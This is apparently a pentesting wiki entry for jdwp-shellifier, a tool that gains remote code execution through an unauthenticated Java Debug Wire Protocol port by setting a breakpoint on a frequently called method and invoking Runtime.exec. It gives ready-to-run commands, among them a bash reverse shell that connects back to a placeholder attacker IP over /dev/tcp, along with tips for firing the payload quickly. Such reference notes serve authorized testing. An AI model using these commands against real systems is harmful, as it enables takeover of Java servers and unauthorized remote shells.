# jdwp-shellifier

**Tags:** `#jdwp-shellifier` `#jdwp` `#java` `#rce` `#exploit`

Automated JDWP→RCE exploitation script. Against an unauthenticated Java Debug Wire Protocol port it sets a breakpoint on a chosen Java method; when any thread hits it (providing a live thread context) it invokes `Runtime.exec` to run a command or drop a reverse shell. Uses `SUSPEND_EVENTTHREAD` so only the triggering thread pauses and the app keeps serving. Breakpoint choice is the reliability knob — the default `java.net.ServerSocket.accept` only fires on a new connection, so a hot method like `java.lang.String.indexOf` lands the payload immediately.

**Source:** original https://github.com/IOActive/jdwp-shellifier (Python2); Python3 forks: https://github.com/s0ld13rr/jdwp-knife
**Install:** Clone a fork; run with the matching Python interpreter.

```bash
# Command execution (py3 fork), breaking on a frequently-called method
python3 jdwp-shellifier.py -t <target> -p 8000 \
  --break-on "java.lang.String.indexOf" --cmd "id"

# Reverse shell (blind — works on any JVM version)
python3 jdwp-shellifier.py -t <target> -p 8000 \
  --break-on "java.lang.String.indexOf" \
  --cmd "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"
```

Manual counterpart: [[Tools/Web/jdb|jdb]].

---

> [!note] **See also** — [[Services/Web Services/JDWP|JDWP]] — one-shot automated RCE against an exposed JDWP port, with the break-on-method strategy explained.

---

*Created: 2026-09-24*
*Updated: 2026-09-24*
*Model: claude-opus-4-8*
